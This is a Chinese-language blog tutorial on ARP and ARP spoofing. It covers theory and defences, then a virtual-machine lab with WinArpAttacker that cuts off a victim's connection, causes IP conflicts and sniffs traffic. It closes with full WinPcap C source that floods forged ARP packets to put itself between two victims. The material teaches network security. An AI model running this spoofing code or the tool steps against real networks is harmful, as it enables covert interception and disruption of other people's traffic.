---
layout: mypost
title: ARP协议及ARP欺骗的Winpcap编程实现
categories: [网络安全]
---



## 一、ARP协议简介

在介绍[arp协议](https://baike.baidu.com/item/ARP/609343)之前，我们先来了解一下[IP地址](https://baike.baidu.com/item/IP/224599?fromtitle=IP%E5%9C%B0%E5%9D%80&fromid=150859)和[MAC地址](https://baike.baidu.com/item/MAC%E5%9C%B0%E5%9D%80)：

- ip地址(ipv4--32位，ipv6-128位)
  - IP地址**（Internet Protocol Address）**，全称互联网协议地址，意思是分配给用户上网使用的网际协议的设备的数字标签，分为IPv4与IPv6两大类，但是也有其他不常用的小分类。
  - 位于[OSI模型](https://baike.baidu.com/item/OSI模型)中第三层网络层
  - 逻辑层面的地址，唯一标识一个网络位置
- mac地址(48位)
  - MAC地址（**Media Access Control Address）**，直译为媒体存取控制位址，也称为物理地址（Physical Address）
  - 位于[OSI模型](https://baike.baidu.com/item/OSI模型)中第二层数据链路层
  - 物理层面的地址，唯一标识一个网络设备



由于IP地址（IPv4，32位，逻辑地址）和mac地址（48位，物理地址）格式不同、性质不同，它们之间不存在简单的映射关系；并且随着主机的加入和退出，IP地址和硬件地址的映射还会发生变化。

这个时候呢人们就想到了一个办法：在主机ARP高速缓冲中，存放一个从IP地址到硬件地址的映射表，这个映射表会经常动态更新 （新增或超时删除），这就是**ARP（Address Resolution Protocol）地址解析协议**





## 二、ARP协议工作过程

1. 主机A想和主机B通信，就先在主机A的ARP高速缓冲中，查看有无主机B的IP地址。如果有，就查出主机B对应的MAC地址。如果没有，主机A会发送一个ARP请求广播包，此包内包含着主机B的IP地址。本局域网上的所有主机都将收到这个ARP请求。

2. 除了主机B，其余主机都不理睬这个ARP请求。主机B在ARP请求分组中看到自己的IP地址，就向主机A发送包含自己硬件地址的ARP响应分组。同时为了提高效率，主机B还把主机A的IP地址和MAC地址的映射关系保存到自己的高速缓存中。

3. 主机A收到主机B的ARP响应分组后，就在其ARP高速缓存中写入主机B的IP地址到硬件地址的映射。这样，主机A、B都有了彼此的IP和硬件地址，双方可以通信了！

   



## 三、ARP协议的缺陷（安全问题）

- ARP协议是建立在**信任**局域网内所有结点的基础上的，这使得它高效但却不安全。
- ARP协议是**无状态**的协议，不会检查自己是否发过请求包，只要收到目标MAC是自己的ARP响应数据包或ARP广播包，都会接受并缓存。
- ARP协议**没有认证机制**，只要接收到的协议包是有效的，主机就无条件地根据协议包的内容刷新本机ARP缓存，并不检查该协议包的合法性。
- <u>因此攻击者可以随时发送虚假ARP包更新被攻击主机上的ARP缓存，进行地址欺骗或拒绝服务攻击。</u>





## 四、ARP相关协议及应用

### 1. RARP（反向ARP ）

- 局域网的物理机器从网关服务器的 ARP 表或者缓存上根据MAC地址请求其 IP 地址，广泛用于获取无盘工作站的IP地址。

### 2. 代理ARP

- 通过使用一个主机（通常为router），来作为指定的设备对另 一设备的ARP请求作出应答。
- 例如，主机PC1（192.168.20.66/24）需要向主机PC2（192.168.20.20/24）发送报文，因为主机PC1不知道[子网](https://baike.baidu.com/item/子网)的存在且和目标主机PC2在同一主网络网段，所以主机PC1将发送ARP协议请求广播报文来请求192.168.20.20的MAC地址。这时，路由器将识别出报文的目标地址属于另一个子网，因此向请求主机回复**自己**的硬件地址（0004.dd9e.cca0）。之后，PC1将发往PC2的数据包都发往MAC地址0004.dd9e.cca0（路由器的接口E0/0），由路由器将数据包转发到目标主机PC2。（接下来路由器将为PC2做同样的代理发送数据包的工作）。

### 3. 无故ARP （Gratuitous ARP，GARP）

- 主机有时会使用自己的IP地址作为目标地址发送ARP请求。主要用来检测IP的地址是否有冲突。

### 4. ARP欺骗的正当用途

1. 在一个需要登录的网上中，让未登录的计算机将其浏览网页强制转向到登录页面，以便登录后才可使用网上。
2. 另外有些设有备援机制的网上设备或服务器，亦需要利用ARP欺骗以在设备出现故障时将讯务导到备用的设备上。



## 五、ARP欺骗攻击原理

### 1. MAC flooding

1. ##### 原理
  
   - 攻击者能让目标网络中的交换机不断泛洪大量不同源MAC地址的数据包，导致交换机内存不足以存放正确的MAC地址和物理端口号相对应的关系表。
2. **效果**
  
   - 如果攻击成功，交换机会降级为集线器（所有新进入交换机的数据包会不经过交换机处理直接广播到所有的端口）。攻击者和目标连接在同一个集线器时，攻击者可设置网卡为混杂模 式，窃听所有数据帧。
3. **过程**
  
   - 向目标交换机发送大量不同源MAC地址的数据包，使得交换机内存不足以存放正确的MAC地址和物理端口号的映射关系。交换机因此降级到集线器模式， 数据包被广播到所有的端口， 攻击者从而能够嗅探网络内信息。



### 2. 中间人攻击（MIM, Man In the Middle）

1. **原理**

   中间人C接收并转发A和B的消息达到嗅探的目的

2. **效果**

   攻击成功后， 主机A发送给主机B的数据包被转发给主机C，主机B发送给主机A的数据包也被转发给主机C，于是A、B之间的数据均被C嗅探。攻击者C会转发重定向到自己的数据包到正确位置，因此A和B没有察觉到嗅探的存在。

3. **过程**

   攻击者C向目标发送虚假应答包， 告诉主机A“主机B的MAC地址是MacC”，告诉主机B“主机A的MAC地址 是MacC”。

   成功后， 主机A发送给主机B的数据包被 转发给主机C，
   主机B发送给主机A的数据包也被 转发给主机C，
   于是A、B之间的数据均被C嗅探。
   攻击者C会转发重定向到自己的数据包到正确位置，因此A和B不会察觉到嗅探的存在。





## 六、ARP欺骗防范技术

### 1. 静态ARP绑定

最理想的防制方法是网上内的每台计算机的ARP一律改用静态的方式，不过这在大型的网上是不可行的，因为需要经常更新每台计算机的ARP表。



### 2. ARP防护软件

有一些软件可监听网上上的ARP回应，若侦测出有不正常变动时可发送邮箱通知管理者。例如UNIX平台的[Arpwatch](https://baike.baidu.com/item/Arpwatch)以及Windows上的XArp v2或一些网上设备的Dynamic ARP inspection功能。



### 3. ARP防护功能的路由器

有些网络设备可借由[DHCP](https://baike.baidu.com/item/DHCP)保留网络上各计算机的MAC地址，在伪造的ARP数据包发出时即可侦测到。此方式已在一些厂牌的网络设备产品所支持。





## 七、ARP欺骗攻击工具实验



### 1. 实验环境

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207114938.png)



| 主机    | 网关          | ip              | mac               |
| ------- | ------------- | --------------- | ----------------- |
| 虚拟机1 | 192.168.150.2 | 192.168.150.128 | 00:0C:29:D3:8D:F4 |
| 虚拟机2 | 192.168.150.2 | 192.168.150.129 | 00:0C:29:45:7A:1A |
| 虚拟机3 | 192.168.150.2 | 192.168.150.130 | 00:0C:29:16:B3:16 |
| 网关    |               | 192.168.150.2   | 00:50:56:E9:A3:2E |

以上的虚拟机操作系统是Windows7，已经关闭了防火墙使得虚拟机两两可以相互**ping**通。

下面的实验都是基于此环境。



### 2. 禁止上网攻击

- 使用**虚拟机1** 攻击 **虚拟机2**

首先打开winarpattacker并扫描局域网，如图：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115007.png)

128、129、130分别是三台虚拟机1、2、3的ip；2是三台虚拟机的网关；254是三台虚拟机的DHCP服务器；1是啥呢我不知道。

选定目标主机（192.168.150.129），选定攻击方式（禁止上网）

在wireshark上使用arp过滤查看arp数据包信息：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115027.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115046.png)

从捕获的数据包来看，整个攻击过程是以下的流程：

1. 攻击者伪造网关的ip（192.168.150.2）和**特定的**mac地址（01-01-01-01-01-01）向受害者发送arp请求，相当于告诉受害者网关的mac地址是01-01-01-01-01-01

2. 攻击者伪造受害者的ip(192.168.150.129)和**特定的**mac地址（01-01-01-01-01-01）向网关（192.168.150.2）发送arp请求，相当于告诉网关受害者的mac地址是01-01-01-01-01-01

3. 此时受害者的arp列表中网关的mac地址已经被更改了：

   

   ![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115105.png)

4. 攻击者使用特定的mac地址（01-01-01-01-01-01）混淆了网关和受害者，使得网关和受害者互相以为对方的mac都是01-01-01-01-01-01，所以受害者无法再和网关通信，从而达到了禁止上网的攻击效果。



### 3. IP冲突攻击

**同样是虚拟机1攻击虚拟机2**

抓包发现ip冲突攻击就是伪造受害者的ip和一个与受害者真实mac不同的mac向受害者发送arp请求，让受害者以为是自己发出去检测是否有机器和自己ip相同的，如果有机器回复，说明自己的ip已经有人占有了。所以就会有ip冲突的效果。

不间断ip冲突就是不停的发送这条arp请求

定时ip冲突就是每隔一段时间发送一次该arp请求。

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115240.png)



但是该攻击只有在受害者需要重新申请ip的时候才会起作用，比如重启，下面是受害者重启后的效果，可以看到受害者的ip已经从192.168.99.128变为192.168.99.130了。

受害者首先肯定是先试了以下128的，但是会发现有人在占用，所以只能使用130了。



### 4. 监听受害者与网关通信

虚拟机1的ip从128变成了130，现在回不来了，所以从现在开始虚拟机1的ip就是192.168.99.130了。

开始攻击

1. 攻击者伪造arp包告诉网关130的mac地址是攻击者的mac地址，这样网关发给受害者的消息就不再发给受害者而是发给攻击者了

   ![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115316.png)

   

2. 攻击者伪造arp包告诉130网关的mac地址是攻击者的mac地址，这样130发给网关的消息就不再发给网关而是发给攻击者了

   ![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115337.png)

   

3. 为了能正常工作，攻击者还要和网关建立正常的arp映射关系：

   ![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115430.png)

4. 然后就可以愉快的监听了

   ![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115456.png)

### 5. 监听两个用户之间的通讯

使用主机1监听主机2和主机3

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115537.png)

选定要监听的两个主机并勾选监听主机通讯：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115559.png)



攻击者抓到的arp 包：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115617.png)

可以看到虚拟机1首先使用虚拟机3的ip和自己的mac地址向虚拟机2发送了arp请求包，让虚拟机2以为虚拟机3的mac地址是虚拟机1的mac地址。

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115645.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115708.png)

然后虚拟机1又对虚拟机3做了同样的处理，使得虚拟机3以为虚拟机2的mac地址是虚拟机1的mac地址：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115727.png)

这样虚拟机2与虚拟机3的通讯信息都会发送到虚拟机1.



这样还不够，虚拟机1还要分别与虚拟机2和虚拟机3建立正常的arp映射关系表，这样虚拟机才能把收到的监听信息发送到它应该的接收者那里去，从而不让受害者察觉自己正在被监听。

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115758.png)





攻击成功，接下来查看虚拟机2和3的状态。

虚拟机2的状态：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115820.png)



虚拟机3的状态：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115838.png)

可以看到虚拟机2和3的arp列表都被更新了他们把对方的ip都指向了攻击者（00:0C:29:D3:8D:F4）

用虚拟机2ping一下虚拟机3：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115900.png)

虚拟机2抓到的通讯包：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207115930.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120008.png)

虚拟机2抓包发现虚拟机2是与虚拟机3的ip在通讯，但是mac地址却是虚拟机1的！整个过程完全没有虚拟机3的参与，尽管虚拟机2的目标是虚拟机3.

虚拟机1抓到的监听的包：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120057.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120121.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120155.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120224.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120241.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120258.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120317.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120334.png)

虚拟机1首先收到虚拟机2发送给虚拟机3的包并转发给虚拟机3，然后收到虚拟机3的回复并转发给虚拟机2.如此是一个icmp包的请求和应答。







## 八、ARP欺骗攻击编程实验

### 1. 方案设计

作为第三方发送伪造arp包更改任意两个受害者的arp列表从而实现中间人攻击。假设我们是A，两个受害者分别是B、C：

1. A作为攻击者使用自己的mac地址和B的ip地址向C发送arp包，C收到包会立即更改自己的arp表，使B的ip地址指向的mac地址为攻击者A的mac地址；
2. A作为攻击者使用自己的mac地址和C的ip地址向B发送arp包，B收到包会立即更改自己的arp表，使C的ip地址指向的mac地址为攻击者A的mac地址；
3. 为了不让受害者B,C改正自己的arp表，A不断地重复以上过程。



### 2. 环境配置

直接使用vs打开Examples-pcap文件夹中的MakeaAll.sln的解决方案：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120413.png)

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120442.png)

打开后发现解决方案中又十个项目，因为我们的任务是发送arp包实现中间人攻击，因此我们只需要用到其中的sendpack项目：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120501.png)

选中该项目右键设置该项目为启动项目，之后启动解决方案就是运行sendpack项目了。现在就可以编辑sendpack.c代码了！



### 3. 开始编码

1. 程序变量

   ```c
   	pcap_if_t* alldevs;			//网卡列表
   	pcap_if_t* d;				//选中的网卡
   	int i = 0;					//全局计数变量
   	int inum;					//定位选中的网卡
   	u_char* packet1[100];		//arp帧包1
   	u_char* packet2[100];		//arp帧包2
   
   	pcap_t *fp;					//启用网卡后的句柄
   	char errbuf[PCAP_ERRBUF_SIZE];		//错误缓冲区
   	int flood;							//发送包的数量
   
   	int self_mac[6];		//攻击者自己的mac地址
   	int victim1_ip[4];		//受害者1的ip
   	int victim1_mac[6];		//受害者1的mac地址
   	int victim2_ip[4];		//受害者2的ip
   	int victim2_mac[6];		//受害者2的mac地址
   
   ```

   

2. 检索网卡

   ```c
   	/* 检索设备列表 */
   	if (pcap_findalldevs(&alldevs, errbuf) == -1)
   	{
   		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
   		exit(1);
   	}
   ```

   

3. 选中并使用网卡

   ```c
   	/* 打开用户选中的网卡适配器 */
   	if ((fp = pcap_open_live(d->name,		// name of the device
   							 65536,			// portion of the packet to capture. It doesn't matter in this case 
   							 1,				// promiscuous mode (nonzero means promiscuous)
   							 1000,			// read timeout
   							 errbuf			// error buffer
   							 )) == NULL)
   	{
   		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
   		return 2;
   	}
   ```

4. 用户输入参数封装arp包

   ```c
   	printf("please input self_mac address like aa-aa-aa-aa-aa-aa: ");
   	scanf_s("%x-%x-%x-%x-%x-%x", &self_mac[0], &self_mac[1], &self_mac[2], &self_mac[3], &self_mac[4], &self_mac[5]);
   
   	printf("please input victim1's ip like 1.1.1.1: ");
   	scanf_s("%d.%d.%d.%d", &victim1_ip[0], &victim1_ip[1], &victim1_ip[2], &victim1_ip[3]);
   
   	printf("please input victim1's mac like aa-aa-aa-aa-aa-aa: ");
   	scanf_s("%x-%x-%x-%x-%x-%x", &victim1_mac[0], &victim1_mac[1], &victim1_mac[2], &victim1_mac[3], &victim1_mac[4], &victim1_mac[5]);
   
   	printf("please input victim2's ip like 1.1.1.1: ");
   	scanf_s("%d.%d.%d.%d", &victim2_ip[0], &victim2_ip[1], &victim2_ip[2], &victim2_ip[3]);
   
   	printf("please input victim2's mac like aa-aa-aa-aa-aa-aa: ");
   	scanf_s("%x-%x-%x-%x-%x-%x", &victim2_mac[0], &victim2_mac[1], &victim2_mac[2], &victim2_mac[3], &victim2_mac[4], &victim2_mac[5]);
   
   	pktbuild(&packet1, self_mac, victim1_ip, victim2_mac, victim2_ip);				//build a arp-packet at &packet
   	pktbuild(&packet2, self_mac, victim2_ip, victim1_mac, victim1_ip);				//build a arp-packet at &packet
   
   	printf("please input the flood(num of packet to send):");
   	scanf_s("%d", &flood);
   ```

5. 循环发包

   ```
   	/* Send down the packet */
   	for (int i = 0; i < flood; i++)
   	{
   		if (pcap_sendpacket(fp,	// Adapter
   			packet1,				// buffer with the packet
   			100				// size
   			) != 0)
   		{
   			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
   			return 3;
   		}
   
   		if (pcap_sendpacket(fp,	// Adapter
   			packet2,				// buffer with the packet
   			100				// size
   		) != 0)
   		{
   			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
   			return 3;
   		}
   
   		Sleep(100);			//发送间隔时间100ms
   	}
   ```

6. 封包函数

   ```c
   /* build arp-packet */
   void pktbuild(u_char *packet, int *smac, int *sip, int *dmac, int *dip)
   {
   	/* 目的以太网地址 */
   	packet[0] = dmac[0];
   	packet[1] = dmac[1];
   	packet[2] = dmac[2];
   	packet[3] = dmac[3];
   	packet[4] = dmac[4];
   	packet[5] = dmac[5];
   
   	/* 源以太网地址 */
   	packet[6] =  smac[0];
   	packet[7] =  smac[1];
   	packet[8] =  smac[2];
   	packet[9] =  smac[3];
   	packet[10] = smac[4];
   	packet[11] = smac[5];
   
   	/* set arp */
   	packet[12] = 0x08;	//0x0806表示该帧封装ARP包
   	packet[13] = 0x06;
   
   	packet[14] = 0x00;	//硬件类型，值为1表示以太网
   	packet[15] = 0x01;
   
   	packet[16] = 0x08;	//协议类型，值为0x0800表示使用的IP地址
   	packet[17] = 0x00;
   
   	packet[18] = 0x06;	//硬件地址长度为6字节
   	packet[19] = 0x04;	//IP地址长度为4字节
   
   	packet[20] = 0x00;	//表示了ARP操作类型
   	packet[21] = 0x01;	//ARP请求为1，ARP响应为2，RARP请求为3，RARP响应为4
   
   	/* 以太网源地址 */
   	packet[22] = smac[0];
   	packet[23] = smac[1];
   	packet[24] = smac[2];
   	packet[25] = smac[3];
   	packet[26] = smac[4];
   	packet[27] = smac[5];
   
   	/* 源ip地址 */
   	packet[28] = sip[0];
   	packet[29] = sip[1];
   	packet[30] = sip[2];
   	packet[31] = sip[3];
   
   	/* 目的以太网地址 */
   	packet[32] = dmac[0];
   	packet[33] = dmac[1];
   	packet[34] = dmac[2];
   	packet[35] = dmac[3];
   	packet[36] = dmac[4];
   	packet[37] = dmac[5];
   
   	/* 目的ip地址 */
   	packet[38] = dip[0];
   	packet[39] = dip[1];
   	packet[40] = dip[2];
   	packet[41] = dip[3];
   
   	/* Fill the rest of the packet with 0 */
   	for (int i = 42; i < 61; i++)
   	{
   		packet[i] = 0x0;
   	}	
   }
   ```



### 4. 攻击效果

1. 受害者1

   ![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120530.png)

2. 受害者2

   ![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120636.png)

3. 攻击者抓包

   攻击过程：
   
   ![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120657.png)
   
   

### 5.完整代码

```c
//2019.10.1
//by zhyjc6
#include <stdlib.h>
#include <stdio.h>
#include <pcap.h>


void pktbuild(u_char* packet, int *smac, int *sip, int *dmac, int* dip);

int main(int argc, char **argv)
{
	pcap_if_t* alldevs;			//网卡列表
	pcap_if_t* d;				//选中的网卡
	int i = 0;					//全局计数变量
	int inum;					//定位选中的网卡
	u_char* packet1[100];		//arp帧包1
	u_char* packet2[100];		//arp帧包2

	pcap_t *fp;					//启用网卡后的句柄
	char errbuf[PCAP_ERRBUF_SIZE];		//错误缓冲区
	int flood;							//发送包的数量

	int self_mac[6];		//攻击者自己的mac地址
	int victim1_ip[4];		//受害者1的ip
	int victim1_mac[6];		//受害者1的mac地址
	int victim2_ip[4];		//受害者2的ip
	int victim2_mac[6];		//受害者2的mac地址

	printf("the arp-attacker starts...\n");

	/* 检索设备列表 */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	printf("请在以下网卡中选择一个使用:\n");
	
	/* 打印网卡列表 */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{  //没有扫描到网卡
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d) to use: ", i);
	scanf_s("%d", &inum);

	/* 检查用户输入是否有效 */
	if (inum < 1 || inum > i)
	{
		printf("\nAdapter number out of range.\n");

		/* 释放所有网卡 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* 跳到用户选中的网卡 */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	/* 打开用户选中的网卡适配器 */
	if ((fp = pcap_open_live(d->name,		// name of the device
							 65536,			// portion of the packet to capture. It doesn't matter in this case 
							 1,				// promiscuous mode (nonzero means promiscuous)
							 1000,			// read timeout
							 errbuf			// error buffer
							 )) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
		return 2;
	}

	printf("please input self_mac address like aa-aa-aa-aa-aa-aa: ");
	scanf_s("%x-%x-%x-%x-%x-%x", &self_mac[0], &self_mac[1], &self_mac[2], &self_mac[3], &self_mac[4], &self_mac[5]);

	printf("please input victim1's ip like 1.1.1.1: ");
	scanf_s("%d.%d.%d.%d", &victim1_ip[0], &victim1_ip[1], &victim1_ip[2], &victim1_ip[3]);

	printf("please input victim1's mac like aa-aa-aa-aa-aa-aa: ");
	scanf_s("%x-%x-%x-%x-%x-%x", &victim1_mac[0], &victim1_mac[1], &victim1_mac[2], &victim1_mac[3], &victim1_mac[4], &victim1_mac[5]);

	printf("please input victim2's ip like 1.1.1.1: ");
	scanf_s("%d.%d.%d.%d", &victim2_ip[0], &victim2_ip[1], &victim2_ip[2], &victim2_ip[3]);

	printf("please input victim2's mac like aa-aa-aa-aa-aa-aa: ");
	scanf_s("%x-%x-%x-%x-%x-%x", &victim2_mac[0], &victim2_mac[1], &victim2_mac[2], &victim2_mac[3], &victim2_mac[4], &victim2_mac[5]);

	pktbuild(&packet1, self_mac, victim1_ip, victim2_mac, victim2_ip);				//build a arp-packet at &packet
	pktbuild(&packet2, self_mac, victim2_ip, victim1_mac, victim1_ip);				//build a arp-packet at &packet

	printf("please input the flood(num of packet to send):");
	scanf_s("%d", &flood);

	/* Send down the packet */
	for (int i = 0; i < flood; i++)
	{
		if (pcap_sendpacket(fp,	// Adapter
			packet1,				// buffer with the packet
			100				// size
			) != 0)
		{
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
			return 3;
		}

		if (pcap_sendpacket(fp,	// Adapter
			packet2,				// buffer with the packet
			100				// size
		) != 0)
		{
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
			return 3;
		}

		Sleep(100);			//发送间隔时间100ms
	}
	pcap_close(fp);
	return 0;
}

/* build arp-packet */
void pktbuild(u_char *packet, int *smac, int *sip, int *dmac, int *dip)
{
	/* 目的以太网地址 */
	packet[0] = dmac[0];
	packet[1] = dmac[1];
	packet[2] = dmac[2];
	packet[3] = dmac[3];
	packet[4] = dmac[4];
	packet[5] = dmac[5];

	/* 源以太网地址 */
	packet[6] =  smac[0];
	packet[7] =  smac[1];
	packet[8] =  smac[2];
	packet[9] =  smac[3];
	packet[10] = smac[4];
	packet[11] = smac[5];

	/* set arp */
	packet[12] = 0x08;	//0x0806表示该帧封装ARP包
	packet[13] = 0x06;

	packet[14] = 0x00;	//硬件类型，值为1表示以太网
	packet[15] = 0x01;

	packet[16] = 0x08;	//协议类型，值为0x0800表示使用的IP地址
	packet[17] = 0x00;

	packet[18] = 0x06;	//硬件地址长度为6字节
	packet[19] = 0x04;	//IP地址长度为4字节

	packet[20] = 0x00;	//表示了ARP操作类型
	packet[21] = 0x01;	//ARP请求为1，ARP响应为2，RARP请求为3，RARP响应为4

	/* 以太网源地址 */
	packet[22] = smac[0];
	packet[23] = smac[1];
	packet[24] = smac[2];
	packet[25] = smac[3];
	packet[26] = smac[4];
	packet[27] = smac[5];

	/* 源ip地址 */
	packet[28] = sip[0];
	packet[29] = sip[1];
	packet[30] = sip[2];
	packet[31] = sip[3];

	/* 目的以太网地址 */
	packet[32] = dmac[0];
	packet[33] = dmac[1];
	packet[34] = dmac[2];
	packet[35] = dmac[3];
	packet[36] = dmac[4];
	packet[37] = dmac[5];

	/* 目的ip地址 */
	packet[38] = dip[0];
	packet[39] = dip[1];
	packet[40] = dip[2];
	packet[41] = dip[3];

	/* Fill the rest of the packet with 0 */
	for (int i = 42; i < 61; i++)
	{
		packet[i] = 0x0;
	}	
}
```





## 九、资源包下载

[Tool.zip](https://pan.baidu.com/s/1_ii5sZoKyfASp0B-gJlC7A)(33.7MB)

资源内包含以下内容：

![](https://cdn.jsdelivr.net/gh/zhyjc6/My-Pictures/2019/12/20191207120737.png)



